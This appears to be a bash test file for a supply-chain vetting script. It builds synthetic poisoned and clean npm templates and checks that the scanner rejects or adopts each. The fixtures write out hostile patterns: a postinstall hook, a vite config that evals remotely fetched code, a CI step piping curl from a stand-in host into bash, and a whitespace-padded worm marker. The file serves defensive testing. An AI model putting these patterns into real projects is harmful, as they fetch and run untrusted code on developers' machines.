#!/usr/bin/env bash
# Offline fixture tests for vet-incoming.sh — inbound supply-chain vetting.
# Builds a synthetic POISONED template (postinstall + config-file dropper) and a
# CLEAN template at runtime, asserts REJECT vs ADOPT. No network, no install/build
# is ever run; all fixture content is inert/synthetic.
# Usage: bash tests/test-vet.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
VET="$ROOT/scripts/vet-incoming.sh"
FAILURES=0

TMP="$(mktemp -d "${TMPDIR:-/tmp}/vet-test.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT

run_expect() { # label dir expected_exit needle
  local label="$1" dir="$2" expect="$3" needle="$4"
  local out code=0
  set +e
  out=$(bash "$VET" "$dir" 2>&1)
  code=$?
  set -e
  local ok=1
  [[ "$code" -eq "$expect" ]] || ok=0
  echo "$out" | grep -qF -- "$needle" || ok=0
  if [[ "$ok" -eq 1 ]]; then
    echo "  ok  $label (exit $code)"
  else
    echo "  XX  $label — expected exit $expect + '$needle', got exit $code"
    echo "$out" | grep -E 'VERDICT|CRIT|HIGH|findings' | head -6
    FAILURES=$((FAILURES + 1))
  fi
}

echo "agent-security test-vet — inbound vetting fixtures (synthetic, offline)"
echo "---"

# 1) POISONED template: install-time postinstall + atob→eval(fetch) in vite config.
#    Inert defensive fixture — never a runnable payload, never executed by the test.
P="$TMP/poison"; mkdir -p "$P"
cat >"$P/package.json" <<'EOF'
{ "name": "starter-kit", "version": "1.0.0",
  "scripts": { "postinstall": "node ./scripts/setup.js", "dev": "vite" } }
EOF
cat >"$P/vite.config.js" <<'EOF'
import { defineConfig } from 'vite';
const u = atob(process.env.CFG_URL || '');
export default defineConfig(async () => { eval(await (await fetch(u)).text()); return {}; });
EOF
run_expect "poisoned template -> REJECT" "$P" 1 "VERDICT: REJECT"
OUTP="$(bash "$VET" "$P" 2>&1 || true)"
echo "$OUTP" | grep -qF "lifecycle script" && echo "  ok  postinstall lifecycle flagged" || { echo "  XX  postinstall not flagged"; FAILURES=$((FAILURES+1)); }
echo "$OUTP" | grep -qF "config file" && echo "  ok  config-file dropper flagged" || { echo "  XX  config dropper not flagged"; FAILURES=$((FAILURES+1)); }
echo "$OUTP" | grep -qF "no install/build/postinstall was or will be run" && echo "  ok  scan-only header present" || { echo "  XX  scan-only header missing"; FAILURES=$((FAILURES+1)); }

# 2) CLEAN template: ordinary scripts, clean config, no lifecycle hooks.
C="$TMP/clean"; mkdir -p "$C"
cat >"$C/package.json" <<'EOF'
{ "name": "starter-kit", "version": "1.0.0",
  "scripts": { "dev": "vite", "build": "vite build", "test": "vitest run" } }
EOF
cat >"$C/vite.config.js" <<'EOF'
import { defineConfig } from 'vite';
export default defineConfig({ plugins: [], server: { port: 5173 } });
EOF
cat >"$C/README.md" <<'EOF'
# starter-kit
A minimal Vite starter. Install with: npm install --ignore-scripts
EOF
run_expect "clean template -> ADOPT" "$C" 0 "VERDICT: ADOPT"

# 3) CI workflow with curl|bash -> REJECT (HIGH), and an unpinned action -> MED.
W="$TMP/ci"; mkdir -p "$W/.github/workflows"
cat >"$W/package.json" <<'EOF'
{ "name": "app", "scripts": { "build": "tsc" } }
EOF
cat >"$W/.github/workflows/deploy.yml" <<'EOF'
name: deploy
on: [push]
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl -sL https://example.invalid/i.sh | bash
EOF
run_expect "CI curl|bash -> REJECT" "$W" 1 "VERDICT: REJECT"

# 4) WORM: a committed postcss config carrying the campaign-tag + whitespace-padded
#    shape (routed through the shared scan-repo.sh engine) -> REJECT.
#    Synthetic fixture — an inert marker string, never a runnable payload.
G="$TMP/worm"; mkdir -p "$G"
cat >"$G/package.json" <<'EOF'
{ "name": "app", "scripts": { "build": "tsc" } }
EOF
WORM_PAD="$(printf '%*s' 7000 '')"
printf 'export default config;%s%s\n' "$WORM_PAD" "global['!']='9-7678';var _0x1a2b3c=1;" >"$G/postcss.config.mjs"
run_expect "committed-config worm -> REJECT" "$G" 1 "VERDICT: REJECT"
OUTG="$(bash "$VET" "$G" 2>&1 || true)"
echo "$OUTG" | grep -qF "WORM" && echo "  ok  WORM class surfaced through vet-incoming" || { echo "  XX  WORM class not surfaced"; FAILURES=$((FAILURES+1)); }

echo "---"
if [[ "$FAILURES" -eq 0 ]]; then
  echo "OK — all vet-incoming fixtures passed"
  exit 0
fi
echo "FAILED — $FAILURES fixture check(s)"
exit 1
